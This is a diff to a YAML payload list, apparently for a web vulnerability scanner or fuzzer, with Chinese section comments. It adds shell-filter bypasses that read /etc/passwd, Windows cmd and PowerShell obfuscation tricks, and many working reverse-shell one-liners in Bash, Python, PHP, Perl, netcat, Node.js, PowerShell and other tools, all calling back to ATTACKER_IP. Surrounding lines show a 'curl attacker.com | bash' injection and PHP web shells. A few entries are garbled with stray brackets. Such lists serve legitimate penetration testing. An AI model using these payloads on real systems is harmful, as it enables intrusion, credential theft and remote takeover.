@@ -63,6 +63,134 @@ command_injection:
 - ; curl http://attacker.com | bash
 - 1;sleep${IFS}5
 - 1;sleep$IFS'5'
+shell_bypass:
+# IFS 替代空格
+- cat${IFS}/etc/passwd
+- cat$IFS/etc/passwd
+- cat${IFS}${IFS}/etc/passwd
+- ;cat${IFS}/etc/passwd
+- '|cat${IFS}/etc/passwd'
+# 制表符/换行替代空格
+- ";cat%09/etc/passwd"
+- ";cat%0a/etc/passwd"
+- ";{cat,/etc/passwd}"
+# $'\x20' 空格替代
+- "$'\\x63\\x61\\x74' /etc/passwd"
+- cat$'\\x20'/etc/passwd
+- "$'\\x69\\x64'"
+# 变量拼接
+- a]a]a=/et]c/pas]swd;cat${a}
+- c=cat;p=/etc/passwd;$c $p
+- "w='who';a='ami';$w$a"
+- a]v=id;$v
+- "X=$'\\x63\\x61\\x74';$X /etc/passwd"
+# 反斜杠绕过
+- c\at /etc/passwd
+- ca\t /etc/passwd
+- w\h\o\a\m\i
+- /b\in/c\at /e\tc/p\as\sw\d
+# 引号绕过
+- c''at /etc/passwd
+- c""at /etc/passwd
+- c'a't /etc/passwd
+- "c\"a\"t /etc/passwd"
+- "w'h'o'a'm'i"
+- "w'\"h\"'o'\"a\"'m'\"i\""
+# $@ 绕过
+- c$@at /etc/passwd
+- w$@hoami
+- "/b${@}in/c${@}at /e${@}tc/p${@}asswd"
+# 通配符绕过
+- /???/??t /???/p??s??
+- /???/c?t /???/p?ss??
+- "/b?n/c?t /e?c/p?s?wd"
+- "/bin/ca[t] /etc/pas[s]wd"
+# 编码绕过
+- echo aWQ= | base64 -d | bash
+- "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh"
+- "bash -c '{echo,aWQ=}|{base64,-d}|bash'"
+- "printf '\\x69\\x64' | sh"
+- "echo -e '\\x69\\x64' | sh"
+# rev 反转绕过
+- "echo 'di' | rev | sh"
+- "echo 'dwssap/cte/ tac' | rev | sh"
+# 变量替代
+- "${PATH%%[a-z]*}id"
+- "${PATH:0:1}etc${PATH:0:1}passwd"
+# 未初始化变量
+- cat /etc/passwd$u
+- cat$u /etc$u/passwd$u
+windows_cmd_bypass:
+# 插入符号 ^ 绕过
+- w^h^o^a^m^i
+- n^e^t u^s^e^r
+- ty^pe c:\\windows\\win.ini
+- po^wer^she^ll -c id
+- p^i^n^g 127.0.0.1
+- n^e^t^s^t^a^t -an
+# 环境变量
+- '%COMSPEC% /c whoami'
+- '%COMSPEC% /c dir'
+- '%SystemRoot%\system32\cmd.exe /c whoami'
+- '%COMSPEC:~0,3%%COMSPEC:~-4,1% /c whoami'
+# set /a
+- 'cmd /c "set /a 1+1"'
+# 变量截取
+- '%OS:~0,1%md /c whoami'
+- "s%COMSPEC:~-6,1%t"
+# %COMSPEC% 拼接
+- '%COMSPEC:~0,1%%COMSPEC:~4,1%%COMSPEC:~8,1%.exe /c whoami'
+# cmd 特殊字符
+- '& whoami'
+- '&& whoami'
+- '| whoami'
+- '|| whoami'
+- 'dir & whoami'
+- 'ping 127.0.0.1 | whoami'
+# PowerShell 绕过
+- "powershell -encodedcommand dwBoAG8AYQBtAGkA"
+- "powershell -e dwBoAG8AYQBtAGkA"
+- "powershell IEX(whoami)"
+- "powershell -w hidden -c whoami"
+- "powershell -nop -c whoami"
+- powershell -exec bypass -c whoami
+reverse_shell:
+# Bash
+- bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+- bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+- 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/4444; sh <&196 >&196 2>&196
+# Python
+- "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+- "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")'"
+- "python -c 'import socket,subprocess;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s,stdout=s,stderr=s)'"
+# Ruby
+- "ruby -rsocket -e'f=TCPSocket.open(\"ATTACKER_IP\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+- "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"ATTACKER_IP\",4444);loop{c.gets.chomp!;(IO.popen(\"#{$_}\",\"r\"){|io|c.print io.read})rescue nil}'"
+# PHP
+- "php -r '$s=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+- "php -r '$s=fsockopen(\"ATTACKER_IP\",4444);$p=proc_open(\"/bin/sh -i\",array(0=>$s,1=>$s,2=>$s),$pipes);'"
+- "php -r '$s=fsockopen(\"ATTACKER_IP\",4444);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+# Perl
+- "perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
+- "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"ATTACKER_IP:4444\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+# Netcat
+- nc -e /bin/sh ATTACKER_IP 4444
+- nc -c /bin/sh ATTACKER_IP 4444
+- ncat ATTACKER_IP 4444 -e /bin/sh
+- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
+- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
+# Lua
+- "lua -e 'local s=require(\"socket\");local t=assert(s.tcp());t:connect(\"ATTACKER_IP\",4444);while true do local r,x=t:receive();local f=assert(io.popen(r,\"r\"));local b=assert(f:read(\"*a\"));t:send(b);end;f:close();t:close();'"
+# OpenSSL
+- mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_IP:4444 > /tmp/s; rm /tmp/s
+# Awk
+- "awk 'BEGIN {s = \"/inet/tcp/0/ATTACKER_IP/4444\"; while(42) { do{ printf \"> \" |& s; s |& getline c; if(c){ while ((c |& getline line) > 0) print line |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
+# Node.js
+- "node -e '(function(){var n=require(\"net\"),c=require(\"child_process\"),s=new n.Socket();s.connect(4444,\"ATTACKER_IP\",function(){c.spawn(\"/bin/sh\",[],{stdio:[s,s,s]})})})()'"
+# Socat
+- socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
+# Windows reverse shell
+- "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$r=$o+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\""
 php:
 - <?php system($_GET['cmd']); ?>
 - <?php passthru($_GET['cmd']); ?>
